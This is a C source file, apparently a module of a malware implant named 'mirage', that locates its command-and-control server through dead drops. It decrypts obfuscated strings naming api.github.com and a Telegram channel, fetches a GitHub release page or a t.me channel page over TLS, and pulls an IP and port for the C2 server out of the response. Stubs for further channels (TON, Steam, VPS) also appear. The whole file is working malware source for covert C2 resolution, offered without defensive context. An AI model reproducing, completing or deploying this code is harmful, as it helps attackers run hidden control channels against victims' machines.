#include "proxy.h"
#include "ws2.h"
#include "schannel.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"

/* ── helpers ────────────────────────────────────────────────────── */

static int parse_c2_address(const char *c2_str, size_t len, proxy_result_t *out) {
    /* find colon separator */
    size_t colon = 0;
    int found = 0;
    for (size_t i = 0; i < len; ++i) {
        if (c2_str[i] == ':') { colon = i; found = 1; break; }
    }
    if (!found || colon == 0 || colon >= len - 1) return 0;

    size_t host_len = colon;
    if (host_len > 255) return 0;

    /* host must be digits/dots only for this parser */
    for (size_t i = 0; i < host_len; ++i) {
        char c = c2_str[i];
        if (!((c >= '0' && c <= '9') || c == '.')) return 0;
    }

    /* parse port */
    char port_buf[8];
    size_t plen = len - colon - 1;
    if (plen == 0 || plen >= sizeof(port_buf)) return 0;
    memcpy(port_buf, c2_str + colon + 1, plen);
    port_buf[plen] = '\0';

    /* L14: strtol trailing-char check omitted — port_buf is all digits (len/char validated above)
     * and the range check (0, 65535] catches any parse error. Safe as-is. */
    long port = strtol(port_buf, NULL, 10);
    if (port <= 0 || port > 65535) return 0;

    /* allocate host */
    char *host = malloc(host_len + 1);
    if (!host) return 0;
    memcpy(host, c2_str, host_len);
    host[host_len] = '\0';

    out->c2_host = host;
    out->c2_port = (uint16_t)port;
    out->level   = PROXY_GITHUB;
    return 1;
}

int proxy_parse_c2(const char *body, size_t body_len, proxy_result_t *out) {
    if (!body || body_len == 0 || !out) return 0;

    char prefix[8]; enc_decrypt(enc_c2_prefix, ENC_C2_PREFIX_LEN, prefix);
    const size_t prefix_len = sizeof(prefix) - 1;

    /* scan for prefix */
    size_t start = 0;
    int found = 0;
    for (size_t i = 0; i + prefix_len <= body_len; ++i) {
        if (memcmp(body + i, prefix, prefix_len) == 0) {
            start = i + prefix_len;
            found = 1;
            break;
        }
    }
    if (!found) return 0;

    /* find terminator */
    size_t remaining = body_len - start;
    size_t max_len = remaining < 256 ? remaining : 256;
    size_t end = max_len;
    for (size_t i = 0; i < max_len; ++i) {
        char c = body[start + i];
        if (c == '\r' || c == '\n' || c == ' ' || c == '<' ||
            c == '\t' || c == '"'  || c == '\'') {
            end = i;
            break;
        }
    }
    if (end == 0) return 0;

    return parse_c2_address(body + start, end, out);
}

/* ── resolve by channel ────────────────────────────────────────── */

static int resolve_github(proxy_result_t *out) {
    /* Decrypt domain: api.github.com */
    char github_host[32];
    enc_decrypt(enc_github_api, ENC_GITHUB_API_LEN, github_host);

    /* Build path: /repos/{user}/{repo}/releases/latest */
    const char *user = "mirage";
    const char *repo = "c2";
    char path[256];
    int n = snprintf(path, sizeof(path), "/repos/%s/%s/releases/latest", user, repo);
    if (n <= 0 || (size_t)n >= sizeof(path)) return 0;

    /* Connect to api.github.com:443 */
    ws2_socket_t sk;
    ws2_result_t r = ws2_connect(&sk, github_host, 443);
    if (r != WS2_OK) return 0;

    /* Wrap connection in TLS */
    tls_context_t tls_ctx;
    tls_result_t tls_res = tls_connect(&tls_ctx, sk.handle, github_host);
    if (tls_res != TLS_OK) { ws2_close(sk.handle); return 0; }

    /* build minimal HTTP GET */
    char request[512];
    int rlen = snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
        path, github_host);
    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { tls_disconnect(&tls_ctx); ws2_close(sk.handle); return 0; }

    size_t sent = 0;
    tls_res = tls_send(&tls_ctx, (const uint8_t *)request, (size_t)rlen, &sent);
    if (tls_res != TLS_OK) { tls_disconnect(&tls_ctx); ws2_close(sk.handle); return 0; }

    /* read response */
    char resp_buf[8192];
    size_t total = 0;
    size_t chunk;
    while (total < sizeof(resp_buf) - 1) {
        tls_res = tls_recv(&tls_ctx, (uint8_t *)resp_buf + total,
                      sizeof(resp_buf) - 1 - total, &chunk);
        if (tls_res != TLS_OK || chunk == 0) break;
        total += chunk;
    }
    resp_buf[total] = '\0';
    tls_disconnect(&tls_ctx);
    ws2_close(sk.handle);

    if (total == 0) return 0;

    /* find body after \r\n\r\n */
    const char *body = strstr(resp_buf, "\r\n\r\n");
    if (!body) return 0;
    body += 4;
    size_t body_len = total - (size_t)(body - resp_buf);

    proxy_result_t tmp;
    if (!proxy_parse_c2(body, body_len, &tmp)) return 0;
    tmp.level = PROXY_GITHUB;
    *out = tmp;
    return 1;
}

static int resolve_telegram(proxy_result_t *out) {
    /* Decrypt domain: t.me */
    char tg_host[16];
    enc_decrypt(enc_telegram_host, ENC_TELEGRAM_HOST_LEN, tg_host);

    char channel_name[32]; enc_decrypt(enc_mirage_c2_channel, ENC_MIRAGE_C2_CHANNEL_LEN, channel_name);
    char path[128];
    int n = snprintf(path, sizeof(path), "/s/%s", channel_name);
    if (n <= 0 || (size_t)n >= sizeof(path)) return 0;

    ws2_socket_t sk;
    ws2_result_t r = ws2_connect(&sk, tg_host, 443);
    if (r != WS2_OK) return 0;

    /* Wrap connection in TLS */
    tls_context_t tls_ctx;
    tls_result_t tls_res = tls_connect(&tls_ctx, sk.handle, tg_host);
    if (tls_res != TLS_OK) { ws2_close(sk.handle); return 0; }

    char request[512];
    int rlen = snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
        path, tg_host);
    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { tls_disconnect(&tls_ctx); ws2_close(sk.handle); return 0; }

    size_t sent = 0;
    tls_res = tls_send(&tls_ctx, (const uint8_t *)request, (size_t)rlen, &sent);
    if (tls_res != TLS_OK) { tls_disconnect(&tls_ctx); ws2_close(sk.handle); return 0; }

    char resp_buf[8192];
    size_t total = 0;
    size_t chunk;
    while (total < sizeof(resp_buf) - 1) {
        tls_res = tls_recv(&tls_ctx, (uint8_t *)resp_buf + total,
                      sizeof(resp_buf) - 1 - total, &chunk);
        if (tls_res != TLS_OK || chunk == 0) break;
        total += chunk;
    }
    resp_buf[total] = '\0';
    tls_disconnect(&tls_ctx);
    ws2_close(sk.handle);

    if (total == 0) return 0;

    const char *body = strstr(resp_buf, "\r\n\r\n");
    if (!body) return 0;
    body += 4;
    size_t body_len = total - (size_t)(body - resp_buf);

    proxy_result_t tmp;
    if (!proxy_parse_c2(body, body_len, &tmp)) return 0;
    tmp.level = PROXY_TELEGRAM;
    *out = tmp;
    return 1;
}

int proxy_resolve(int channel, proxy_result_t *out) {
    if (!out) return 0;
    memset(out, 0, sizeof(*out));

    switch (channel) {
    case PROXY_GITHUB:   return resolve_github(out);
    case PROXY_TELEGRAM: return resolve_telegram(out);
    case PROXY_TON:
    case PROXY_STEAM:
    case PROXY_VPS:
    default:
        return 0;
    }
}
